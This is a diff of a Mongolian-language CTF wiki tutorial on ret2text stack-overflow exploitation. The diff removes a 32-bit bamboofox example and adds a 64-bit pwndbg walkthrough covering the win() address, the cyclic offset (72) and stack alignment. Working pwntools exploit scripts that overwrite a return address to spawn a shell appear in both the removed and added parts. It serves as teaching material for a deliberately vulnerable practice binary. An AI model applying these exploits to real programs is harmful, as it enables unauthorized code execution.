@@ -12,36 +12,37 @@ description: Stack overflow ашиглан программын өөрийн к�
 
 :::note[Урьдчилсан мэдлэг]
 - C хэлний үндэс, `gets()`/`read()` зэрэг функц
-- x86 / x86-64 assembly-ийн суурь (`push`, `call`, `leave`, `ret`)
-- `gdb` (pwndbg эсвэл GEF) болон Python-ий `pwntools`
+- x86-64 assembly-ийн суурь (`push`, `call`, `leave`, `ret`)
+- `gdb` (pwndbg эсвэл GEF) болон Python-ий `pwntools` — gdb-г анх удаа ашиглаж байвал [pwndbg үндэс](../../tools/gdb/) хуудсыг уншаарай
 :::
 
 ## Санаа
 
-Функц дуудагдах үед stack дээр дараах бүтэц үүснэ (32-bit):
+Функц дуудагдах үед stack дээр дараах бүтэц үүснэ (64-bit):
 
-```
-  хаяг
- +----------------------+
- |  return address      |  <- ebp + 4   ← бид үүнийг дарж бичнэ
- +----------------------+
- |  saved ebp           |  <- ebp
- +----------------------+
- |                      |
- |  char buf[...]       |  <- бидний оруулсан өгөгдөл эндээс эхэлнэ
- |                      |
- +----------------------+
- хаяг
+```ansi
+[1m их хаяг[0m                        [36m▲[0m
+[90m┌──────────────────────────┐[0m                   [36m│[0m
+[90m│[0m[1;31m  return address  (8 B)   [0m[90m│[0m  ← rbp + 8      [36m│[0m  [1;31m← бид үүнийг дарж бичнэ[0m
+[90m├──────────────────────────┤[0m                   [36m│[0m
+[90m│[0m[33m  saved rbp       (8 B)   [0m[90m│[0m  ← rbp          [36m│[0m
+[90m├──────────────────────────┤[0m                   [36m│[0m  [36mgets() өгөгдлийг[0m
+[90m│[0m[32m                          [0m[90m│[0m                 [36m│[0m  [36mэнэ чиглэлд бичнэ[0m
+[90m│[0m[32m  char buf[...]           [0m[90m│[0m                 [36m│[0m
+[90m│[0m[32m                          [0m[90m│[0m  ← buf          [36m│[0m  [32m← өгөгдөл эндээс эхэлнэ[0m
+[90m└──────────────────────────┘[0m
+[1m бага хаяг[0m
 ```
 
 `gets()` шиг урт шалгадаггүй функц `buf`-аас илүү өгөгдөл хүлээж авбал өгөгдөл **дээшээ** (их хаяг руу)
-урсаж, `saved ebp`, улмаар `return address`-ийг дарна. Функц `ret` заавар гүйцэтгэх үед CPU stack-ийн оройгоос
+урсаж, `saved rbp`, улмаар `return address`-ийг дарна. Функц `ret` заавар гүйцэтгэх үед CPU stack-ийн оройгоос
 хаягийг аваад тийш үсэрдэг — тэр хаяг одоо **бидний сонгосон** хаяг болсон байна.
 
 Тиймээс халдлагын өгөгдөл (payload) ердөө хоёр хэсэгтэй:
 
-```
-[ padding: buf-ийн эхнээс return address хүртэлх байт ] + [ зорилтот хаяг ]
+```ansi
+[32m[ buf ................ ][0m[33m[ saved rbp ][0m[1;31m[ зорилтот хаяг ][0m
+[90m └──────── padding (offset) ────────┘ └─ return address ─┘[0m
 ```
 
 Бидэнд хоёр зүйл л олох хэрэгтэй:
@@ -57,144 +58,7 @@ ret2text ажиллах нөхцөл:
 | PIE | **Байхгүй** (эсвэл хаяг leak хийсэн) | PIE байвал `.text`-ийн хаяг ажиллах бүрт өөрчлөгдөнө |
 | NX | Хамаагүй | Бид shellcode ажиллуулахгүй, байгаа кодыг л ашиглана |
 
-## Жишээ 1: bamboofox ret2text (32-bit)
-
-Энэ жишээ [CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text)-ээс авсан.
-Binary-г [ctf-wiki/ctf-challenges](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text) repo-оос татаж авна.
-
-### Эх код
-
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <time.h>
-
-void secure(void)
-{
-    int secretcode, input;
-    srand(time(NULL));
-
-    secretcode = rand();
-    scanf("%d", &input);
-    if(input == secretcode)
-        system("/bin/sh");
-}
-
-int main(void)
-{
-    setvbuf(stdout, 0LL, 2, 0LL);
-    setvbuf(stdin, 0LL, 1, 0LL);
-
-    char buf[100];
-
-    printf("There is something amazing here, do you know anything?\n");
-    gets(buf);
-    printf("Maybe I will tell you next time !");
-
-    return 0;
-}
-```
-
-Хоёр зүйл анхаарал татна:
-
-- `main` дотор `gets(buf)` — урт шалгахгүй тул **stack overflow** байна.
-- `secure()` функц `system("/bin/sh")` дууддаг ч санамсаргүй тоог таах шаардлагатай. `main` үүнийг огт дууддаггүй.
-
-### Хамгаалалт шалгах
-
-```console
-$ checksec ret2text
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-```
-
-Canary байхгүй, PIE байхгүй — ret2text хийхэд тохиромжтой.
-
-### Зорилтот хаягийг олох
-
-`secure()`-ийн disassembly (IDA):
-
-```asm
-.text:0804862D     call    ___isoc99_scanf
-.text:08048632     mov     eax, [ebp+input]
-.text:08048635     cmp     eax, [ebp+secretcode]
-.text:08048638     jnz     short locret_8048646
-.text:0804863A     mov     dword ptr [esp], offset command ; "/bin/sh"
-.text:08048641     call    _system
-```
-
-`secure()`-ийн эхэнд үсэрвэл санамсаргүй тоо таах хэрэгтэй болно. Харин **шалгалтын дараах**
-`0x0804863A` хаяг руу шууд үсэрвэл `"/bin/sh"`-ийг аргумент болгон тавиад `system()`-ийг дуудна —
-`if` шалгалтыг бүхэлд нь алгасна.
-
-:::tip
-Зорилтот хаяг заавал функцийн эхлэл байх албагүй. Функцийн **дунд** байгаа ямар ч зааврын хаяг руу үсэрч болно.
-Үүгээр шалгалт, нөхцөлийг алгасах боломжтой.
-:::
-
-### Offset тооцох
-
-`main`-ийн `gets` дуудах хэсэг:
-
-```asm
-.text:080486A7     lea     eax, [esp+1Ch]
-.text:080486AB     mov     [esp], eax      ; s
-.text:080486AE     call    _gets
-```
-
-`buf` нь `esp + 0x1c` дээр байна. `main` эхэндээ `and esp, 0FFFFFFF0h` хийж stack-ийг тэгшилдэг тул
-`buf`-ийн `ebp`-ээс хэр зайтайг статикаар тооцоход төвөгтэй. Иймд gdb-ээр `gets` дуудахын өмнө зогсоож
-регистрүүдийг харъя:
-
-```console
-$ gdb ./ret2text
-gef➤  b *0x080486AE
-gef➤  r
-...
-$esp   : 0xffffcd40
-$ebp   : 0xffffcdc8
-```
-
-Тооцоо:
-
-```
-buf            = esp + 0x1c       = 0xffffcd5c
-ebp - buf      = 0xffffcdc8 - 0xffffcd5c = 0x6c   (108 байт)
-return address = ebp + 4
-offset         = 0x6c + 4         = 0x70   (112 байт)
-```
-
-:::caution
-Эх кодод `char buf[100]` гэж байгаа ч бодит offset нь `100 + 4` **биш**. Compiler тэгшлэх (alignment)
-болон бусад хувьсагчийн зай нэмдэг. Offset-ийг **үргэлж** debugger эсвэл disassembly-аас тодорхойл.
-:::
-
-### Exploit
-
-```python
-from pwn import *
-
-p = process('./ret2text')
-
-target = 0x0804863A          # system("/bin/sh") дуудах хэсэг
-payload = b'A' * 0x70 + p32(target)
-
-p.sendline(payload)
-p.interactive()
-```
-
-`p32()` нь хаягийг **little-endian** 4 байт болгоно: `0x0804863A` → `\x3a\x86\x04\x08`.
-
-## Жишээ 2: Өөрсдөө compile хийх (64-bit)
-
-Орчин үеийн ихэнх бодлого 64-bit байдаг. Өөрийн компьютер дээр бүтэн процессыг давтаж үзье.
-
-### Файлууд
+## Бодлого
 
 Бүх файл [`challenges/pwn/ret2text`](https://github.com/computer-communication-security-club/ctf-wiki/tree/main/challenges/pwn/ret2text) хавтсанд байна:
 
@@ -206,7 +70,7 @@ p.interactive()
 | [`Makefile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/ret2text/Makefile) | `make run`, `make stop` |
 
 :::tip
-Бэлэн binary-г ашиглавал энэ хуудсан дээрх хаягууд (`objdump` гаралт гэх мэт) таных яг ижил гарна.
+Бэлэн binary-г ашиглавал энэ хуудсан дээрх хаягууд (gdb гаралт гэх мэт) таных яг ижил гарна.
 Өөрөө `gcc`-ээр compile хийвэл compiler-ийн хувилбараас хамаарч хаяг өөр байж болно.
 :::
 
@@ -226,7 +90,13 @@ Repo татахгүйгээр бэлэн image-ийг шууд ажиллуул�
 $ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-ret2text
 ```
 
-### Эх код ба compile
+:::caution[Spoiler]
+Доорх хэсэгт бүтэн шийдэл байна. Эхлээд өөрөө оролдоод үзээрэй!
+:::
+
+## Шийдэл
+
+### 1. Эх кодыг унших
 
 ```c title="main.c"
 #include <stdio.h>
@@ -253,8 +123,16 @@ int main(void) {
 }
 ```
 
+Хоёр зүйл анхаарал татна:
+
+- `vuln()` дотор `gets(buf)` — урт шалгахгүй тул **stack overflow** байна.
+- `win()` функц `system("/bin/sh")` дууддаг ч программ үүнийг **хэзээ ч дууддаггүй**.
+
+Зорилго: `vuln()`-ийн return address-ийг `win()`-ийн хаягаар дарж бичих.
+
+### 2. Хамгаалалт шалгах
+
 ```console
-$ gcc main.c -o ret2text -fno-stack-protector -no-pie
 $ checksec --file=ret2text
     RELRO:      Partial RELRO
     Stack:      No canary found
@@ -262,63 +140,137 @@ $ checksec --file=ret2text
     PIE:        No PIE (0x400000)
 ```
 
+Canary байхгүй, PIE байхгүй — ret2text хийхэд тохиромжтой. Binary-г дараах флагуудаар compile хийсэн:
+
+```console
+$ gcc main.c -o ret2text -fno-stack-protector -no-pie
+```
+
 - `-fno-stack-protector` — canary-г унтраана
 - `-no-pie` — `.text`-ийн хаягийг тогтмол болгоно
 
-### Offset олох: статик арга
+### 3. Зорилтот хаяг олох
 
-```console
-$ objdump -d -M intel ret2text | grep -A12 '<vuln>:'
-  4011c3:  push   rbp
-  4011c4:  mov    rbp,rsp
-  4011c7:  sub    rsp,0x40
-  ...
-  4011da:  lea    rax,[rbp-0x40]
-  4011de:  mov    rdi,rax
-  4011e1:  call   401090 <gets@plt>
-  4011e6:  nop
-  4011e7:  leave
-  4011e8:  ret
+pwndbg-ээр binary-г нээгээд `info functions` (`info fu`) командаар бүх функцийг жагсаана:
+
+```ansi
+$ gdb ./ret2text
+[1;31mpwndbg>[0m info fu
+All defined functions:
+
+Non-debugging symbols:
+[34m0x0000000000401000[0m  [33m_init[0m
+[34m0x0000000000401070[0m  [33mputs@plt[0m
+[34m0x0000000000401080[0m  [33msystem@plt[0m
+[34m0x0000000000401090[0m  [33mgets@plt[0m
+[34m0x00000000004010a0[0m  [33msetvbuf@plt[0m
+[34m0x00000000004010b0[0m  [33m_start[0m
+[34m0x00000000004010e0[0m  [33m_dl_relocate_static_pie[0m
+[34m0x00000000004010f0[0m  [33mderegister_tm_clones[0m
+[34m0x0000000000401120[0m  [33mregister_tm_clones[0m
+[34m0x0000000000401160[0m  [33m__do_global_dtors_aux[0m
+[34m0x0000000000401190[0m  [33mframe_dummy[0m
+[34m0x0000000000401196[0m  [33mwin[0m
+[34m0x00000000004011bf[0m  [33mvuln[0m
+[34m0x00000000004011e9[0m  [33mmain[0m
+[34m0x000000000040122c[0m  [33m_fini[0m
 ```
 
-`buf = rbp - 0x40`. 64-bit дээр `saved rbp` 8 байт тул:
+Зорилтот хаяг: **`0x401196`**. pwntools дээр `elf.sym.win` гэж автоматаар авна.
 
-```
-offset = 0x40 + 8 = 72
-```
-
-### Offset олох: cyclic арга
-
-Статик арга төвөгтэй үед **De Bruijn pattern** (`cyclic`) ашиглана. Энэ дараалал дахь 4 байт бүр
-давтагдашгүй тул программ унах үед return address-д ямар утга орсныг хараад offset-ийг шууд олно.
-
-```python title="find_offset.py"
-from pwn import *
-
-elf = context.binary = ELF('./ret2text')
-
-p = process()
-p.sendlineafter(b'name?\n', cyclic(200))
-p.wait()                      # программ segfault болтол хүлээнэ
-
-core = p.corefile             # core dump-ийг уншина
-offset = cyclic_find(core.read(core.rsp, 4))
-log.success(f'offset = {offset}')
-```
-
-```console
-$ ulimit -c unlimited
-$ python3 find_offset.py
-[+] offset = 72
-```
-
-:::note
-64-bit дээр буруу хаяг (`0x6161617461616173` гэх мэт) нь *canonical* биш тул CPU `ret` дээрээ унана —
-`rip` өөрчлөгдөхгүй. Тиймээс `rip`-ийг биш, **`rsp`-ийн зааж буй утгыг** (`ret`-ийн авах гэж байсан хаяг) шалгадаг.
-gdb дээр: `x/wx $rsp` хийж гарсан 4 байтыг `pwn cyclic -l 0x61616173` гэж хайна.
+:::tip
+Зорилтот хаяг заавал функцийн эхлэл байх албагүй. Функцийн **дунд** байгаа ямар ч зааврын хаяг руу үсэрч болно.
+Жишээ нь шалгалт (`if`) бүхий функцэд шалгалтын дараах хаяг руу шууд үсэрч нөхцөлийг алгасаж болно.
 :::
 
-### Stack alignment (movaps асуудал)
+### 4. Offset олох
+
+Offset-ийг тооцоолох шаардлагагүй — pwndbg-ээр шууд олно. Санаа нь: давтагдашгүй **cyclic pattern**-ийг
+программд өгөөд, программ унах үед return address-ийн байранд pattern-ийн аль хэсэг очсоныг харах.
+
+**1. Pattern үүсгээд программыг ажиллуулна.** Нэр асуухад pattern-ийг хуулж оруулна:
+
+```ansi
+[1;31mpwndbg>[0m !pwn cyclic 200
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+[1;31mpwndbg>[0m r
+Starting program: ./ret2text
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+What is your name?
+
+Program received signal [31mSIGSEGV[0m, Segmentation fault.
+[31m0x00000000004011e8[0m in vuln ()
+```
+
+**2. Context-ийг уншина.** Программ `SIGSEGV`-ээр унахад pwndbg бүх мэдээллийг харуулна:
+
+```ansi
+LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [31mWX[0m | RODATA
+[34m───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────[0m
+ [1mRAX[0m  [33m0x7fffffffd940[0m ◂— 0x6161616261616161 ('aaaabaaa')
+ [1mRBX[0m  0
+ [1mRCX[0m  [35m0x7ffff7e14760 (_IO_stdfile_0_lock)[0m ◂— 0
+ [1mRDX[0m  [35m0x7ffff7e14760 (_IO_stdfile_0_lock)[0m ◂— 0
+ [1mRDI[0m  [33m0x7fffffffd941[0m ◂— 'aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+ [1mRSI[0m  [34m0x405011[0m ◂— 0x6361616162616161 ('aaabaaac')
+ [1mR8[0m   [34m0x4050d9[0m ◂— 0
+ [1mR9[0m   0xfbad2288
+ [1mR10[0m  0
+ [1mR11[0m  0x202
+ [1mR12[0m  [33m0x7fffffffdac8[0m —▸ [33m0x7fffffffdea6[0m ◂— './ret2text'
+ [1mR13[0m  1
+ [1mR14[0m  [35m0x7ffff7ffd000 (_rtld_global)[0m —▸ [35m0x7ffff7ffe2e0[0m ◂— 0
+ [1mR15[0m  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ [31m0x401160 (__do_global_dtors_aux)[0m ◂— endbr64
+ [1mRBP[0m  0x6161617261616171 ('qaaaraaa')
+ [1mRSP[0m  [33m0x7fffffffd988[0m ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+ [1mRIP[0m  [31m0x4011e8 (vuln+41)[0m ◂— ret
+[34m────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────[0m
+[90m   0x4011e1 <vuln+34>    call   gets@plt                    <gets@plt>[0m
+[90m   0x4011e6 <vuln+39>    nop[0m
+[90m   0x4011e7 <vuln+40>    leave[0m
+[1;32m ► [0m[31m0x4011e8[0m <vuln+41>    [38;5;148mret[0m                                <0x6161617461616173>
+    ↓
+[34m─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────[0m
+00:0000│ [1mrsp[0m [33m0x7fffffffd988[0m ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+01:0008│     [33m0x7fffffffd990[0m ◂— 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+02:0010│     [33m0x7fffffffd998[0m ◂— 'waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+03:0018│     [33m0x7fffffffd9a0[0m ◂— 'yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+04:0020│     [33m0x7fffffffd9a8[0m ◂— 'baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+05:0028│     [33m0x7fffffffd9b0[0m ◂— 'daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+06:0030│     [33m0x7fffffffd9b8[0m ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+07:0038│     [33m0x7fffffffd9c0[0m ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+[34m───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────[0m
+ [1;32m►[0m 0 [31m0x4011e8[0m           vuln+41
+   1 0x6161617461616173
+   2 0x6161617661616175
+   3 0x6161617861616177
+   4 0x6261617a61616179
+   5 0x6261616362616162
+   6 0x6261616562616164
+   7 0x6261616762616166
+[34m──────────────────────────────────────────[ LAST SIGNAL ]───────────────────────────────────────────[0m
+Program received signal [31mSIGSEGV[0m (fault address: 0x0).
+[34m────────────────────────────────────────────────────────────────────────────────────────────────────[0m
+```
+
+- **DISASM** — программ `vuln`-ийн `ret` заавар дээр унасан. `ret` нь `0x6161617461616173` хаяг руу буцах гэж оролдсон.
+  Энэ бол бидний pattern (`'saaataaa'`) — return address дарагдсан гэсэн үг.
+- **RSP** — stack-ийн орой `'saaataaa...'` байна. `ret` яг энэ утгыг буцах хаяг болгон авдаг.
+- **RBP** — `'qaaaraaa'`: `saved rbp` ч мөн дарагдсан.
+
+**3. Stack-ийн оройн 4 байтыг уншина:**
+
+```ansi
+[1;31mpwndbg>[0m x/x $rsp
+[33m0x7fffffffd988[0m:    0x61616173
+```
+
+**4. Offset-ийг хайна.** `0x61616173` (`'saaa'`) pattern-ийн хэддүгээр байтаас эхэлдгийг `cyclic -l`-ээр олно:
+`!pwn cyclic -l 0x61616173` → **72**.
+
+Offset = **72**: эхний 72 байт `buf` болон `saved rbp`-г дүүргэж, дараагийн 8 байт return address болно.
+
+### 5. Stack alignment (movaps асуудал)
 
 Эхлээд хамгийн энгийн payload-ийг туршъя:
 
@@ -336,11 +288,11 @@ glibc-ийн `system()` дотор `movaps` заавар байдаг бөгөө
 шилжүүлж тэгшилнэ.
 
 :::tip
-Өөр нэг арга: `win`-ийн эхний `push rbp`-г алгасаж `elf.sym.win + 5` (эсвэл `+1`, `endbr64` байхгүй бол)
-руу үсрэх. Энэ нь бас 8 байтын зөрүүг засна.
+Өөр нэг арга: `win`-ийн эхний `endbr64` (4 байт) ба `push rbp` (1 байт)-ийг алгасаж
+`elf.sym.win + 5` (`0x40119b`) руу үсрэх. `push` хийгдэхгүй тул бас 8 байтын зөрүү засагдана.
 :::
 
-### Exploit
+### 6. Exploit
 
 ```python title="exploit.py"
 from pwn import *
@@ -365,10 +317,10 @@ p.interactive()
 $ python3 exploit.py
 [*] Switching to interactive mode
 Congrats! Here is your shell:
-$ id
-uid=1000(user) gid=1000(user) ...
+$ cat flag.txt
 ```
 
+`p64()`/`flat()` нь хаягийг **little-endian** 8 байт болгоно: `0x401196` → `\x96\x11\x40\x00\x00\x00\x00\x00`.
 `elf.sym.win` нь хаягийг symbol table-аас автоматаар авдаг тул дахин compile хийсэн ч скрипт ажиллана.
 
 ## Хамгаалалт
